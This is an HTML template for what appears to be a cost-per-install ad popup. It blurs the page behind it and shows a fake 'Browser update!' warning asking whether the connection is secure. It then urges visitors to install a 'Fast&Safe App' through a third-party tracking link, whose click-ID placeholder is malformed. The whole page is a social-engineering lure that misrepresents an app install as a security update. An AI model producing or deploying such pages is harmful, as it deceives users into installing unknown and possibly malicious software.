<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CPI Offer UI</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background: url('blurred_background.jpg') no-repeat center center/cover;
            position: relative;
        }
        
        .overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            backdrop-filter: blur(10px);
        }
        
        .popup {
            position: absolute;
            background: white;
            padding: 20px;
            border-radius: 10px;
            text-align: center;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
        }
        
        .popup h2 {
            margin: 0;
            font-size: 20px;
        }
        
        .popup p {
            font-size: 14px;
            color: #333;
        }
        
        .popup a {
            display: block;
            margin-top: 10px;
            padding: 10px;
            background: blue;
            color: white;
            text-decoration: none;
            border-radius: 5px;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <div class="overlay"></div>
    <div class="popup">
        <h2>Browser update!</h2>
        <p>Is your connection secure? <br>
        Install Fast&Safe App to watch any videos in Safe mode</p>
        <a href="https://uthephifie.net/link?z=9157142&var={SOURCE_ID}&ymid={CLICK_ID">Install</a>
    </div>
</body>
</html>
